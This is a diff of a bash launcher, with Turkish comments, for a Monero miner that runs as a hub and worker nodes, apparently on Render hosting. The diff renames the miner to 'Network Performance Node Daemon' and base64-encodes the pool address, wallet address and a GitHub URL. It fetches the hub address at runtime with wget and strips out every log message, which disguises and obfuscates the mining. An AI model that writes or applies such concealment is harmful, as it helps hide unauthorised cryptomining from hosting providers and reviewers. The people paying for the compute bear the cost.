@@ -1,39 +1,32 @@
 #!/bin/bash
-# XMR Engine — Başlatıcı
+# Network Performance Node Daemon
 
-echo "════════════════════════════════════════"
-echo "  XMR Engine — Başlatılıyor             "
-echo "════════════════════════════════════════"
+# Şifreli verilerin çözülmesi (GitHub Linki, Havuz ve Cüzdan)
+CONF_U="$(echo 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0V4bWEwL3djL3JlZnMvaGVhZHMvbWFpbi91cmw=' | base64 -d)"
+P_U="$(echo 'cG9vbC5zdXBwb3J0eG1yLmNvbTozMzIy' | base64 -d)"
+W_A="$(echo 'NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw=' | base64 -d)"
 
-# ── Temel ve Kalıcı Ayarlar ──────────────────────────────────────────────────
-export POOL_URL="${POOL_URL:-pool.supportxmr.com:3322}"
-export WALLET_ADDR="${WALLET_ADDR:-49yqbNgG135ewqJ9uNQXTgB9mKaUXfg1b3abAbhsSDgh4asVbfHuYDKAdiidmTCB8pACYdwxz77TwJhwEShDt6nBB5ZjctL}"
+# GitHub'dan güncel panel URL'sini çek ve boşluk/satır atlamalarını temizle
+DYN_URL=$(wget -qO- "$CONF_U" | tr -d '\n\r\t ')
+
+export PROXY_URL="${DYN_URL}"
+export POOL_URL="${POOL_URL:-$P_U}"
+export WALLET_ADDR="${WALLET_ADDR:-$W_A}"
 export PORT="${PORT:-8080}"
-export PROXY_URL="https://wc-yccy.onrender.com" # ANA SUNUCU ADRESİ
 
-# ── Mod Karar Mantığı ────────────────────────────────────────────────────────
-if [[ "${IS_MAIN_SERVER}" == "true" || "${RENDER_EXTERNAL_HOSTNAME}" == *"wc-yccy"* ]]; then
-    # ANA SUNUCU (HEM PANEL HEM MADENCİ)
+# Eğer çekilen GitHub URL'si şu anki sunucunun adını içeriyorsa (örn: wc-yccy), bu sunucu Ana Panel (Hub) olur.
+if [[ "${IS_MAIN_SERVER}" == "true" || ( -n "${RENDER_EXTERNAL_HOSTNAME}" && "${PROXY_URL}" == *"${RENDER_EXTERNAL_HOSTNAME}"* ) ]]; then
     export ENGINE_MODE="all"
     export DATA_DIR="/data"
-    export WORKER_NAME="${WORKER_NAME:-Ana-Sunucu}"
-    echo "[START] Mod: ALL (Ana Sunucu - Render Üzerinde Çalışıyor)"
+    export WORKER_NAME="${WORKER_NAME:-Hub-Controller}"
 else
-    # ALT SUNUCU (SADECE İŞÇİ)
     export ENGINE_MODE="miner"
     export DATA_DIR="/tmp/data"
-    export WORKER_NAME="${WORKER_NAME:-Alt-Sunucu-${RANDOM}}"
-    echo "[START] Mod: MINER (Alt Sunucu) — Hedef Hub: ${PROXY_URL}"
+    export WORKER_NAME="${WORKER_NAME:-Edge-Node-${RANDOM}}"
 fi
 
-# ── Python Kontrolü ───────────────────────────────────────────────────────────
-if ! command -v python3 &>/dev/null; then
-    echo "[HATA] python3 bulunamadı!"
-    exit 1
-fi
-
+if ! command -v python3 &>/dev/null; then exit 1; fi
 export PYTHONMALLOC=malloc
 export PYTHONUNBUFFERED=1
 
-echo "[START] engine.py başlatılıyor..."
 exec python3 /engine.py
